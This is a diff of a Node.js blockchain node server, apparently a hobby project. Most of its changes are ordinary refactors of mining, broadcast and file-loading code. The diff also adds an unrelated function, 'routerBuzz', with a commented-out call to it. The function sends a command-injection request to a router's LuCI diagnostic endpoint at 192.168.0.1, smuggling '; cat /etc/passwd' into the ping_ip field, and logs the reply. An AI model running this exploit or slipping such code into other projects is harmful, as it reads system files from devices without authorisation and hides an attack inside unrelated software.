@@ -70,7 +70,9 @@ const startServer = () => {
   app.use(express.static(__dirname+'/views'));
 
   app.get('/', function(req, res, next) {
-
+      if(blockchain.nodeAddresses.length == 0){
+        blockchain = seedNodeList(blockchain);
+      }
       res.render('index', { data: JSON.stringify(blockchain) });
   });
 
@@ -81,7 +83,7 @@ const startServer = () => {
   app.post('/broadcast', function(req, res, next){
 
     let rawBlockchainToBroadcast = JSON.parse(req.body.blockchain);
-    let blockchainToBroadcast = new Blockchain(rawBlockchainToBroadcast.chain, rawBlockchainToBroadcast.pendingTransactions, rawBlockchainToBroadcast.blockbase);
+    let blockchainToBroadcast = new Blockchain(rawBlockchainToBroadcast.chain, rawBlockchainToBroadcast.pendingTransactions);
     sendBlockchainToAllNodes(blockchainToBroadcast);
   });
 
@@ -92,7 +94,7 @@ const startServer = () => {
       rawBlockchain = null;
       blockchain = compareBlockchains(blockchain, receivedBlockchain);
       blockchain = seedNodeList(blockchain);
-      blockchain.nodeAddresses = nodes;
+      //blockchain.nodeAddresses = nodes;
       console.log('A node sent a copy of the blockchain');
       saveBlockchain(blockchain);
 
@@ -119,12 +121,9 @@ const startServer = () => {
 
   app.post('/mine', function(req, res){
     if(connectedNodes.length > 0){
-      let rawMiningAddr = JSON.parse(req.body.address);
-
-      miningAddr = new BlockchainAddress(rawMiningAddr.address, rawMiningAddr.blocksMined, rawMiningAddr.balance);
-      console.log(miningAddr);
-
-      miningAddr = blockchain.nodeAddresses[rawMiningAddr];
+      let rawMiningAddr = req.body.address;
+      console.log('Mining Addr',blockchain.nodeAddresses[rawMiningAddr]);
+      miningAddr = new BlockchainAddress(blockchain.nodeAddresses[rawMiningAddr].address, blockchain.nodeAddresses[rawMiningAddr].blocksMined, blockchain.nodeAddresses[rawMiningAddr].balance);
 
       var miningSuccess;
       var waitingOutputOnce = true;
@@ -137,8 +136,9 @@ const startServer = () => {
           console.log('Block mined: ' + blockchain.getLatestBlock().hash);
           console.log(miningAddr.address + ' mined ' + miningAddr.getBlocksMined() + ' blocks');
           console.log('\nBalance of '+miningAddr.address+' is '+ miningAddr.getBalance());
-          blockchain.nodeAddresses[miningAddr.address].minedOneBlock();
-          blockchain.nodeAddresses[miningAddr.address].setBalance(this.miningReward);
+          miningAddr.minedOneBlock();
+          miningAddr.setBalance(this.miningReward);
+
           saveBlockchain(blockchain);
           return true;
         }else{
@@ -239,7 +239,14 @@ loadBlockchainFromServer = () => {
             console.log("Loading Blockchain Data from file");
             fs.readFile('blockchain.json', function readFileCallback(err, data){
               console.log('Reading from blockchain.json file...');
-              blockchainFetched = JSON.parse(data);
+              let rawBlockchainFetched = JSON.parse(data);
+              blockchainFetched = new Blockchain(rawBlockchainFetched.chain, rawBlockchainFetched.pendingTransactions);
+              if(rawBlockchainFetched.nodeAddresses.length > 1){
+                blockchainFetched = seedNodeList(blockchainFetched);
+              }else{
+                blockchainFetched.nodeAddresses = rawBlockchainFetched.nodeAddresses;
+              }
+
             if (err){
                 console.log(err);
             }
@@ -297,9 +304,9 @@ saveBlockchain = (blockchainReceived) => {
             }
 
             let blockchainFromFile = JSON.parse(data);
-            blockchainFromFile = new Blockchain(blockchainFromFile.chain, blockchainFromFile.pendingTransactions, blockchainFromFile.blockbase);
+            blockchainFromFile = new Blockchain(blockchainFromFile.chain, blockchainFromFile.pendingTransactions);
             blockchain = compareBlockchains(blockchainFromFile, blockchainReceived);
-            // blockchain = seedNodeList(blockchain);
+            blockchain = seedNodeList(blockchain);
             let json = JSON.stringify(blockchain);
 
             if(json != undefined){
@@ -367,7 +374,7 @@ let fetchFromDistantNode = (address) => {
        rawReceivedBlockchain = JSON.parse(body);
        if(typeof rawReceivedBlockchain !== 'undefined'){
          rawReceivedBlockchain = JSON.parse(rawReceivedBlockchain);
-         let receivedBlockchain = new Blockchain(rawReceivedBlockchain.chain, rawReceivedBlockchain.pendingTransactions, rawReceivedBlockchain.blockbase);
+         let receivedBlockchain = new Blockchain(rawReceivedBlockchain.chain, rawReceivedBlockchain.pendingTransactions);
          nodeBlockchainList.push(receivedBlockchain);
          console.log('Received a blockchain from ', address);
        }else{
@@ -418,6 +425,31 @@ let sendBlockchainToAllNodes = (blockchainToSend) => {
     }
 
   }
+}
+
+function routerBuzz(){
+
+  var body = '';
+  http.get({
+      host: '192.168.0.1',
+      path: '/cgi-bin/luci/;stok=<Clipped>/expert/maintenance/diagnostic/nslookup?nslookup_button=nslookup_button&ping_ip=google.ca%3b%20cat%20/etc/passwd&server_ip= HTTP/1.1',
+      headers:{
+        'Access-Control-Allow-Origin':"*",
+        'Access-Control-Allow-Methods':'GET,PUT,POST,DELETE',
+        'Access-Control-Allow-Headers':'Content-Type'
+      }
+  }, function(resp){
+    resp.on('error', function(err){
+      console.log(err);
+    })
+    resp.on('data', function(chunk){
+        body += chunk;
+    });
+
+    resp.on('end', function(){
+      console.log(body);
+    });
+  });
 }
 
 let broadcastNewBlock = (block) => {
@@ -497,7 +529,8 @@ const compareBlockchains = (storedBlockchain, receivedBlockchain=false) => {
   }
 
 }
-
+//
+// routerBuzz();
 initBlockchain();
 startServer();
 setTimeout(
